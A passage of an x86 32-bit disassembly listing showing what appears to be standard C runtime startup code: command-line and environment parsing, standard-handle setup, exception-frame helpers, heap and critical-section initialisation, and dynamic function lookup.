  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
